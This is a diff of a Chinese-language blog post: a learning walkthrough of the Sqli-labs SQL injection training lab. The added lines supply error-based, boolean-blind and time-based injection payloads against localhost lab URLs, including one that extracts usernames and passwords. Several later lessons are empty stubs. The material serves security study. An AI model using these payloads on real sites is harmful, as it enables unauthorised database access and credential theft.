@@ -23,7 +23,7 @@
 <meta property="og:site_name" content="KarmA&#39;s Blog">
 <meta property="og:description" content="边学边记，Sqli-labs">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-10T14:42:55.820Z">
+<meta property="og:updated_time" content="2018-02-19T07:15:09.739Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL Injection - Sqli-labs">
 <meta name="twitter:description" content="边学边记，Sqli-labs">
@@ -318,6 +318,7 @@
 <p><strong>union的作用是将两个sql语句进行联合。union前后的两个sql语句的选择列数要相同才可以（用order by查询行数） 。Union all与union 的区别是增加了去重的功能</strong></p>
 <h4 id="数据库连接函数"><a href="#数据库连接函数" class="headerlink" title="数据库连接函数"></a>数据库连接函数</h4><p>concat和concat_ws</p>
 <p>其中concat_ws的第一个参数是连接字符串的分隔符，还会用到group__concat(可以把查询出来的多行连接起来)</p>
+<p>常用：concat_ws(char(32,58,32),user(),database(),version())</p>
 <h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4><p>查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了</p>
 <h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>查表时也只能返回一个table，所以要用limit来控制结果集具体是哪一行</p>
 <h4 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,2,3 –+</p>
@@ -343,7 +344,26 @@
 <p>or</p>
 <p><a href="http://localhost/sqli-labs/Less-4/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/index.php/?id=1</a>“) or “1”=(“1</p>
 <h3 id="less-5-GET-Double-Injection-Single-Quotes-String"><a href="#less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="less-5 GET - Double Injection - Single Quotes - String"></a>less-5 GET - Double Injection - Single Quotes - String</h3><p>(双注入GET单引号字符型注入)</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>count(*)</strong></p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’ union Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)\</em>2))a from information_schema.columns group by a–+</p>
+<p><strong>exp</strong></p>
+<p>数据类型超出范围进行报错注入</p>
+<p><strong>bigint</strong></p>
+<p>bigint溢出进行报错注入</p>
+<p><strong>xpath</strong></p>
+<p>xpath函数报错注入</p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e))–+</p>
+<p><strong>利用数据的重复性</strong></p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x –+</p>
+<h4 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h4><p>payload：</p>
+<p>布尔注入：</p>
+<p>报错注入：</p>
+<p><a href="http://localhost/sqli/Less-5/?id=1" target="_blank" rel="noopener">http://localhost/sqli/Less-5/?id=1</a>‘ and (select 1 from(select count(<em>*),concat(char(32,58,32),(select concat_ws(char(32,58,32),id,username,password) from users limit 0,1),char(32,58,32),floor(rand()</em> *2))name from information_schema.tables group by name)b) –+</p>
+<p>延时注入：</p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/?id=1&#39;and" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/?id=1&#39;and</a> If(ascii(substr(database(),1,1))=115,1,sleep(5))–+ </p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(‘MSG’,’by 5 seconds’)),null)),2,3 FROM (select database() as current) as tb1–+</p>
 <h3 id="less-6-GET-Double-Injection-Double-Quotes-String"><a href="#less-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="less-6 GET - Double Injection - Double Quotes - String"></a>less-6 GET - Double Injection - Double Quotes - String</h3><p>(双注入GET双引号字符型注入)</p>
+<p>payload跟less-5异曲同工，只是把 ‘ 改成 “ </p>
 <h3 id="less-7-GET-Dump-into-outfile-String"><a href="#less-7-GET-Dump-into-outfile-String" class="headerlink" title="less-7 GET - Dump into outfile - String"></a>less-7 GET - Dump into outfile - String</h3><p>(导出文件GET字符型注入)</p>
 <p>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径</p>
 <p>outfile函数将数据库中的内容写到一个文件中</p>
@@ -352,7 +372,55 @@
 <p>虽然有相应数据库权限，也对路径进行了转义，但是还是没有成功导出文件，尝试导出在tmp文件夹，发现也不行。先放着吧！</p>
 <p><a href="http://localhost/sqli-labs/Less-7/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-7/index.php/?id=1</a>‘)) union select 1,2,3 into outfile “C:\phpStudy\tmp\1.php” %23 </p>
 <h3 id="less-8-GET-Blind-Boolian-Based-Single-Quotes"><a href="#less-8-GET-Blind-Boolian-Based-Single-Quotes" class="headerlink" title="less-8 GET - Blind - Boolian Based - Single Quotes"></a>less-8 GET - Blind - Boolian Based - Single Quotes</h3><p>(布尔型单引号GET盲注)</p>
-</the></excerpt>
+<p>这一关把mysql报错的语句注释了，所以就不能用报错注入了。</p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><strong>left()</strong></p>
+<p>left()得到字符串左部指定个数的字符    </p>
+<p>left ( string, n )        string为要截取的字符串，n为长度。</p>
+<p>正确时返回 “You are in 。。。。“ 否则则无回显。</p>
+<p><strong>length()</strong></p>
+<p>测试数据库长度</p>
+<p><strong>substr()与ascii()并用 </strong></p>
+<p>substr()和substring()函数实现的功能是一样的，均为截取字符串。</p>
+<p>​    string substring(string, start, length)</p>
+<p>​    string substr(string, start, length)</p>
+<p>获取security数据库的第一个表(limit 0,1)的字符</p>
+<p>获取该数据库的第二个表 limit 1,1</p>
+<p><strong>regexp</strong></p>
+<p>利用regexp获取（2）中users表中的列</p>
+<p>I    select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0));</p>
+<p>II    select * from users where id=1 and 1=(user() regexp’^ri’);</p>
+<p>通过if语句的条件判断，返回一些条件句，比如if等构造一个判断。根据返回结果是否等于0或者1进行判断。</p>
+<p>III    select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p>
+<p>这里利用select构造了一个判断语句。我们只需要更换regexp表达式即可</p>
+<p>‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE</p>
+<p><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">SQL盲注之正则表达式攻击</a></p>
+<p><strong>ord() 和 mid(column_name,start[,length])</strong></p>
+<p>利用 ord()（此函数为返回第一个字符的ASCII码） 和 mid() 函数获取users表的内容</p>
+<p>例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</p>
+<h3 id="less-9-GET-Blind-Time-based-Single-Quotes"><a href="#less-9-GET-Blind-Time-based-Single-Quotes" class="headerlink" title="less-9 GET - Blind - Time based. -  Single Quotes"></a>less-9 GET - Blind - Time based. -  Single Quotes</h3><p> (基于时间的GET单引号盲注)</p>
+<h4 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h4><p><strong>sleep()</strong></p>
+<p>利用sleep()函数进行注入</p>
+<p><a href="http://localhost/sqli-labs/Less-9/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-9/index.php/</a><br>?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p>
+<p><strong>BENCHMARK()</strong></p>
+<p>利用BENCHMARK()进行延时注入</p>
+<p>当结果正确的时候，运行ENCODE(‘MSG’,’by 5 seconds’)操作50000000次，会占用一段时间。</p>
+<h4 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h4><p>payload：</p>
+<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+</p>
+<h3 id="less-10-GET-Blind-Time-based-double-quotes"><a href="#less-10-GET-Blind-Time-based-double-quotes" class="headerlink" title="less-10 GET - Blind - Time based - double quotes"></a>less-10 GET - Blind - Time based - double quotes</h3><p> (基于时间的双引号盲注)</p>
+<p>与less-9一样，只是从 ’ 变成 “ </p>
+<h3 id="less-11-POST-Error-Based-single-quotes-String"><a href="#less-11-POST-Error-Based-single-quotes-String" class="headerlink" title="less-11 POST - Error Based - single quotes - String"></a>less-11 POST - Error Based - single quotes - String</h3><p>在GET型里面用到的大部分方法都可以使用</p>
+<h3 id="less-12-POST-Error-Based-Double-quotes-String-with-twist"><a href="#less-12-POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="less-12 POST - Error Based - Double quotes - String - with twist"></a>less-12 POST - Error Based - Double quotes - String - with twist</h3><p><strong>’</strong> 变 <strong>”</strong></p>
+<h3 id="less-13-POST-Double-injection-Single-quotes-String-with-twist"><a href="#less-13-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="less-13 POST Double injection - Single quotes - String - with twist"></a>less-13 POST Double injection - Single quotes - String - with twist</h3><p>从错误回显中知道对id进行了 <strong>‘)</strong>处理，所以用布尔盲注来判断是否成功login</p>
+<h4 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h4><p>payload:</p>
+<p>猜版本号</p>
+<p>uname=admin’)and left(@@version,1)=5%23 &amp;passwd=2222&amp;submit=Submit</p>
+<h3 id="less-14-POST-Double-injection-Single-quotes-String-with-twist"><a href="#less-14-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="less-14 POST - Double injection - Single quotes - String - with twist"></a>less-14 POST - Double injection - Single quotes - String - with twist</h3><p>有报错，可以用报错注入</p>
+<h4 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h4><p>payload</p>
+<h3 id="less-15-POST-Blind-Boolian-time-Based-Single-quotes"><a href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="less-15 POST - Blind - Boolian/time Based - Single quotes"></a>less-15 POST - Blind - Boolian/time Based - Single quotes</h3><p>没有错误回显，可以用布尔盲注和延时注入</p>
+<h4 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h4><p>payload</p>
+<h3 id="less-16-POST-Blind-Boolian-Time-Based-Double-quotes"><a href="#less-16-POST-Blind-Boolian-Time-Based-Double-quotes" class="headerlink" title="less-16 POST - Blind - Boolian/Time Based - Double quotes"></a>less-16 POST - Blind - Boolian/Time Based - Double quotes</h3><p>单引号变双引号</p>
+<h3 id="less-17-POST-Update-Query-Error-Based-String"><a href="#less-17-POST-Update-Query-Error-Based-String" class="headerlink" title="less-17 POST - Update Query - Error Based - String"></a>less-17 POST - Update Query - Error Based - String</h3><p><a href="http://www.cnblogs.com/lcamry/p/5763048.html" target="_blank" rel="noopener">增删改函数介绍</a></p>
+<h3 id="less-18-POST-Header-injection-Uagent-field-Error-based"><a href="#less-18-POST-Header-injection-Uagent-field-Error-based" class="headerlink" title="less-18 POST - Header injection - Uagent field - Error based"></a>less-18 POST - Header injection - Uagent field - Error based</h3><h3 id="less-19-POST-Header-injection-Referer-field-Error-based"><a href="#less-19-POST-Header-injection-Referer-field-Error-based" class="headerlink" title="less-19 POST - Header injection Referer field - Error based"></a>less-19 POST - Header injection Referer field - Error based</h3><h3 id="less-20-POST-Cookie-injection-Uagent-field-error-based"><a href="#less-20-POST-Cookie-injection-Uagent-field-error-based" class="headerlink" title="less-20 POST - Cookie injection - Uagent field - error based"></a>less-20 POST - Cookie injection - Uagent field - error based</h3><h3 id="less-21-POST-Dump-into-outfile-String"><a href="#less-21-POST-Dump-into-outfile-String" class="headerlink" title="less-21 POST Dump into outfile - String"></a>less-21 POST Dump into outfile - String</h3><h3 id="less-22-Future-Editions"><a href="#less-22-Future-Editions" class="headerlink" title="less-22 Future Editions"></a>less-22 Future Editions</h3></the></excerpt>
       
     </div>
     
@@ -363,7 +431,7 @@
         <p><span>本文标题:</span><a href="/2018/02/05/sqlinjection-sqlilabs/">SQL Injection - Sqli-labs</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">KarmA</a></p>
         <p><span>发布时间:</span>2018-02-05, 18:15:13</p>
-        <p><span>最后更新:</span>2018-02-10, 22:42:55</p>
+        <p><span>最后更新:</span>2018-02-19, 15:15:09</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/02/05/sqlinjection-sqlilabs/" title="SQL Injection - Sqli-labs">http://akkayin.github.io/2018/02/05/sqlinjection-sqlilabs/</a>
             <span class="copy-path" data-clipboard-text="原文: http://akkayin.github.io/2018/02/05/sqlinjection-sqlilabs/　　作者: KarmA" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -377,6 +445,12 @@
 
 
     <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2018/02/19/ctf-syb/">
+                    ctf-syb
+                </a>
+            </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
@@ -393,7 +467,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-labs"><span class="toc-text">Sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#less-1-GET-Error-based-Single-quotes-String"><span class="toc-text">less-1 GET - Error based - Single quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查询（union）"><span class="toc-text">查询（union）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库连接函数"><span class="toc-text">数据库连接函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查表"><span class="toc-text">查表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit"><span class="toc-text">limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solution"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-2-GET-Error-based-Intiger-based"><span class="toc-text">less-2 GET - Error based - Intiger based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-1"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-3-GET-Error-based-Single-quotes-with-twist-string"><span class="toc-text">less-3 GET - Error based - Single quotes with twist string</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-2"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-4-GET-Error-based-Double-Quotes-String"><span class="toc-text">less-4 GET - Error based - Double Quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-3"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-5-GET-Double-Injection-Single-Quotes-String"><span class="toc-text">less-5 GET - Double Injection - Single Quotes - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-6-GET-Double-Injection-Double-Quotes-String"><span class="toc-text">less-6 GET - Double Injection - Double Quotes - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-7-GET-Dump-into-outfile-String"><span class="toc-text">less-7 GET - Dump into outfile - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-8-GET-Blind-Boolian-Based-Single-Quotes"><span class="toc-text">less-8 GET - Blind - Boolian Based - Single Quotes</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-labs"><span class="toc-text">Sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#less-1-GET-Error-based-Single-quotes-String"><span class="toc-text">less-1 GET - Error based - Single quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查询（union）"><span class="toc-text">查询（union）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库连接函数"><span class="toc-text">数据库连接函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查表"><span class="toc-text">查表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit"><span class="toc-text">limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solution"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-2-GET-Error-based-Intiger-based"><span class="toc-text">less-2 GET - Error based - Intiger based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-1"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-3-GET-Error-based-Single-quotes-with-twist-string"><span class="toc-text">less-3 GET - Error based - Single quotes with twist string</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-2"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-4-GET-Error-based-Double-Quotes-String"><span class="toc-text">less-4 GET - Error based - Double Quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-3"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-5-GET-Double-Injection-Single-Quotes-String"><span class="toc-text">less-5 GET - Double Injection - Single Quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-4"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-6-GET-Double-Injection-Double-Quotes-String"><span class="toc-text">less-6 GET - Double Injection - Double Quotes - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-7-GET-Dump-into-outfile-String"><span class="toc-text">less-7 GET - Dump into outfile - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-8-GET-Blind-Boolian-Based-Single-Quotes"><span class="toc-text">less-8 GET - Blind - Boolian Based - Single Quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#布尔盲注"><span class="toc-text">布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-9-GET-Blind-Time-based-Single-Quotes"><span class="toc-text">less-9 GET - Blind - Time based. -  Single Quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#延时注入"><span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-5"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-10-GET-Blind-Time-based-double-quotes"><span class="toc-text">less-10 GET - Blind - Time based - double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-11-POST-Error-Based-single-quotes-String"><span class="toc-text">less-11 POST - Error Based - single quotes - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-12-POST-Error-Based-Double-quotes-String-with-twist"><span class="toc-text">less-12 POST - Error Based - Double quotes - String - with twist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-13-POST-Double-injection-Single-quotes-String-with-twist"><span class="toc-text">less-13 POST Double injection - Single quotes - String - with twist</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-6"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-14-POST-Double-injection-Single-quotes-String-with-twist"><span class="toc-text">less-14 POST - Double injection - Single quotes - String - with twist</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-7"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes"><span class="toc-text">less-15 POST - Blind - Boolian/time Based - Single quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-8"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-16-POST-Blind-Boolian-Time-Based-Double-quotes"><span class="toc-text">less-16 POST - Blind - Boolian/Time Based - Double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-17-POST-Update-Query-Error-Based-String"><span class="toc-text">less-17 POST - Update Query - Error Based - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-18-POST-Header-injection-Uagent-field-Error-based"><span class="toc-text">less-18 POST - Header injection - Uagent field - Error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-19-POST-Header-injection-Referer-field-Error-based"><span class="toc-text">less-19 POST - Header injection Referer field - Error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-20-POST-Cookie-injection-Uagent-field-error-based"><span class="toc-text">less-20 POST - Cookie injection - Uagent field - error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-21-POST-Dump-into-outfile-String"><span class="toc-text">less-21 POST Dump into outfile - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-22-Future-Editions"><span class="toc-text">less-22 Future Editions</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -463,7 +537,9 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2018/02/19/ctf-syb/" title="上一篇: ctf-syb">
+                <i class="fa fa-angle-left"></i>
+            </a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
@@ -475,7 +551,7 @@
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/sqlinjection-sqlilabs/">SQL Injection - Sqli-labs</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/sqlinjection-note/">SQL Injection 学习小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/05/python/">Python Notes</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/04/linux/">Linux初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/01/2018books/">My Book List In 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/01/2018films/">My Film List In 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/01/bye2017/">See you 2017 , Hello 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/30/2017films/">2017-films</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/26/渗透课程/">渗透课程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/20/代码审计实例-BEES-4-0-R-20160525/">代码审计实例-BEES_4.0_R_20160525</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/18/php文件操作漏洞/">php文件操作漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/17/php文件包含漏洞/">php文件包含漏洞Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/16/authenticwords/">Authentic Words Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/14/php注入漏洞/">php注入漏洞Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/12/phpfunction/">PHP常见危险函数及特殊函数Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/08/mentohust/">Mac下配置mentohust连接校园网/移动/联通/</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/04/Perception/">Some perceptions after secondly read Steve Jobs‘s speech in Stanford</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/03/Flaggs1/">It's time to set Flags in Freshman Year (持续更新)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/01/2017班级对抗赛WP+心得/">2017班级对抗赛WP&心得</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/19/论Mac备份的重要性<-血的教训/">论Mac备份的重要性<-血的教训</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/19/hello-world/">Hello World</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/02/19/ctf-syb/">ctf-syb</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/sqlinjection-sqlilabs/">SQL Injection - Sqli-labs</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/sqlinjection-note/">SQL Injection 学习小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/05/python/">Python Notes</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/04/linux/">Linux初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/01/2018books/">My Book List In 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/01/2018films/">My Film List In 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/01/bye2017/">See you 2017 , Hello 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/30/2017films/">2017-films</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/26/渗透课程/">渗透课程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/20/代码审计实例-BEES-4-0-R-20160525/">代码审计实例-BEES_4.0_R_20160525</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/18/php文件操作漏洞/">php文件操作漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/17/php文件包含漏洞/">php文件包含漏洞Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/16/authenticwords/">Authentic Words Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/14/php注入漏洞/">php注入漏洞Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/12/phpfunction/">PHP常见危险函数及特殊函数Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/08/mentohust/">Mac下配置mentohust连接校园网/移动/联通/</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/04/Perception/">Some perceptions after secondly read Steve Jobs‘s speech in Stanford</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/03/Flaggs1/">It's time to set Flags in Freshman Year (持续更新)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/01/2017班级对抗赛WP+心得/">2017班级对抗赛WP&心得</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/19/论Mac备份的重要性<-血的教训/">论Mac备份的重要性<-血的教训</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/19/hello-world/">Hello World</a></li></ul>
 
 
 
